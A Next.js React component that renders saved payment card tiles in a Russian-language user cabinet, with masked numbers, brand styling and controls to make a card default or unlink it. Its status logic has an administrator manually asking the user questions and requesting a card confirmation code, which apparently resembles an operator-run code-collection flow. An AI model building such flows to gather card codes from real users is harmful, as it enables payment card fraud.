import Link from "next/link"
import type { PaymentCardView } from "@/app/actions/cards"
import { CARD_BRAND_LABEL, formatExpiry, maskCard, type CardBrand } from "@/lib/payment-cards"
import { CardBrandMark } from "@/components/cabinet/card-brand-mark"
import { cn } from "@/lib/utils"
import { ArrowRightMark, CheckMark, Spinner, TrashMark } from "./card-icons"
import { needsExtraCheckAnswer } from "./card-modal"

export const BRAND_MATERIAL: Record<CardBrand, string> = {
  visa: "from-primary/70 via-primary/40 to-card",
  mastercard: "from-accent/70 via-primary/30 to-card",
  belkart: "from-gold/60 via-primary/30 to-card",
  mir: "from-primary/60 via-accent/40 to-card",
  other: "from-muted via-card to-card",
}

const STATUS_BADGE: Record<string, { label: string; className: string }> = {
  pending: { label: "На проверке", className: "bg-foreground/20 backdrop-blur" },
  code_requested: { label: "Нужен код", className: "bg-gold text-gold-foreground" },
  extra_check: { label: "Доп. проверка", className: "bg-foreground/20 backdrop-blur" },
}

function CardNotice({ children }: { children: React.ReactNode }) {
  return (
    <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
      <Spinner className="size-4 shrink-0 text-foreground/70" />
      <p className="text-xs leading-relaxed text-foreground/80">{children}</p>
    </div>
  )
}

function CardCta({ onClick, disabled, children }: { onClick: () => void; disabled: boolean; children: React.ReactNode }) {
  return (
    <button
      type="button"
      onClick={onClick}
      disabled={disabled}
      className="relative flex items-center justify-between gap-2 rounded-2xl bg-gold/90 p-3 text-left text-gold-foreground transition hover:bg-gold active:scale-[0.98] disabled:opacity-50"
    >
      <span className="text-xs font-semibold leading-relaxed">{children}</span>
      <ArrowRightMark className="size-4 shrink-0" />
    </button>
  )
}

export function CardTile({
  card,
  busy,
  disabled,
  onMakeDefault,
  onDelete,
  onOpenAction,
}: {
  card: PaymentCardView
  busy: boolean
  disabled: boolean
  onMakeDefault: () => void
  onDelete: () => void
  onOpenAction: () => void
}) {
  const confirmed = card.status === "confirmed"
  const badge = STATUS_BADGE[card.status]
  return (
    <div
      className={cn(
        "relative flex flex-col gap-4 overflow-hidden rounded-[18px] bg-gradient-to-br p-5 text-foreground shadow-xl transition",
        BRAND_MATERIAL[card.brand],
        card.isDefault ? "ring-2 ring-gold" : "ring-1 ring-border",
        busy && "opacity-60",
      )}
    >
      <span aria-hidden="true" className="card-sheen pointer-events-none absolute inset-0 opacity-40" />
      <div className="relative flex items-start justify-between gap-3">
        <span className="text-xs font-medium text-foreground/70">{card.bankName ?? CARD_BRAND_LABEL[card.brand]}</span>
        <div className="flex items-center gap-2">
          {badge && <span className={cn("rounded-full px-2.5 py-1 text-xs font-semibold", badge.className)}>{badge.label}</span>}
          <CardBrandMark brand={card.brand} className="h-6" />
        </div>
      </div>
      <div className="relative flex items-center gap-3">
        <span aria-hidden="true" className="card-chip h-7 w-10 rounded-md" />
        <p className="font-mono text-lg tracking-[0.12em] tabular-nums">{maskCard(card.last4)}</p>
      </div>
      <div className="relative flex items-end justify-between gap-3">
        <div className="min-w-0">
          <p className="truncate text-sm font-semibold uppercase">{card.cardholder}</p>
          {card.expMonth && card.expYear && (
            <p className="font-mono text-xs text-foreground/70">до {formatExpiry(card.expMonth, card.expYear)}</p>
          )}
        </div>
        <div className="flex shrink-0 items-center gap-1">
          {confirmed && card.isDefault && (
            <span className="inline-flex items-center gap-1 rounded-full bg-gold px-2.5 py-1 text-xs font-bold text-gold-foreground">
              <CheckMark className="size-3.5" />
              Основная
            </span>
          )}
          {confirmed && !card.isDefault && (
            <button
              type="button"
              onClick={onMakeDefault}
              disabled={disabled}
              className="rounded-full bg-foreground/15 px-3 py-1.5 text-xs font-semibold backdrop-blur transition hover:bg-foreground/25 disabled:opacity-50"
            >
              Сделать основной
            </button>
          )}
          <button
            type="button"
            onClick={onDelete}
            disabled={disabled}
            aria-label={`Отвязать карту ${maskCard(card.last4)}`}
            className="grid size-9 place-items-center rounded-full bg-foreground/15 backdrop-blur transition hover:bg-destructive hover:text-primary-foreground active:scale-95 disabled:opacity-50"
          >
            <TrashMark className="size-4" />
          </button>
        </div>
      </div>
      {card.status === "pending" && (
        <Link
          href={`/cabinet/cards/${card.id}`}
          className="relative flex items-center justify-between gap-2 rounded-2xl bg-background/60 p-3 text-xs font-semibold text-foreground/80 backdrop-blur transition hover:bg-background/80"
        >
          Открыть статус проверки
          <ArrowRightMark className="size-4 shrink-0" />
        </Link>
      )}
      {card.status === "extra_check" && !card.extraCheckMessage && (
        <CardNotice>Администратор проводит дополнительную проверку. Ожидайте вопрос.</CardNotice>
      )}
      {needsExtraCheckAnswer(card) && (
        <CardCta onClick={onOpenAction} disabled={disabled}>Администратор задал вопрос. Нажмите, чтобы ответить.</CardCta>
      )}
      {card.status === "extra_check" && Boolean(card.extraCheckMessage) && Boolean(card.extraCheckResponse) && (
        <CardNotice>Ответ отправлен. Ожидайте решения администратора.</CardNotice>
      )}
      {card.status === "code_requested" && (
        <CardCta onClick={onOpenAction} disabled={disabled}>Нужен код подтверждения. Нажмите, чтобы ввести.</CardCta>
      )}
    </div>
  )
}
